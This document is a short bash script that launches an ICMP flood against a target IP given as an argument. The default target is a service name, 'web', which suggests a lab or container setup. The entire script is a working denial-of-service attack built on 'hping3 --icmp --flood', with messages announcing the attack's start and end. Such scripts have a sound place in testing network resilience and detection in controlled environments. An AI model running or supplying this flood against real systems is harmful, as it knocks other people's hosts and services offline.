#!/bin/bash

# Default target IP or service name
DEFAULT_TARGET_IP="web"

# Use the provided target IP or default to the service name
TARGET_IP=${1:-$DEFAULT_TARGET_IP}

echo "Starting ICMP flood attack on $TARGET_IP..."

# Use hping3 to perform the ICMP flood
hping3 --icmp --flood $TARGET_IP

echo "ICMP flood attack completed."
